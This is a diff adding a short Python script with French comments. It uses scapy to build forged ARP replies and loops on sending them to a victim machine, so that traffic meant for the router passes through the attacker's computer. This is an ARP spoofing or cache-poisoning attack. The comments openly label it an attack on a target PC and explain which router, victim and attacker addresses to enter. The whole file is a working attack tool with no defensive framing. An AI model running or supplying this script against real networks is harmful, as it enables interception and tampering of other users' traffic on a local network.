@@ -1,0 +1,17 @@
+from scapy.all import * #j'importe la bibliothèque scapy avec toutes les options
+
+#Attaque vers le PC cible
+eth = Ether(type = 0x0806)
+
+pac = ARP()
+pac.hwlen = 6 #taille de l'adresse MAC
+pac.plen = 4 #taille de l'adresse IPV4
+pac.op = 2 #type de l'entête
+pac.psrc =  input('entrez l adresse IP du routeur : ') #il faut entrer l'IP du routeur sur lequel les 2 appareils sont connectés
+pac.pdst = input('entrez l adresse IP du destinataire : ') #Entrer l'adresse IP de la victime
+pac.hwsrc = input('entrez l adresse MAC de source : ') #Entrer l'adresse MAC du PC attaquant
+pac.hwdst = input('entrez l adresse MAC de destination : ') #Entrer l'adresse MAC de la victime
+attaque = eth / pac
+
+while True:
+    sendp(attaque)
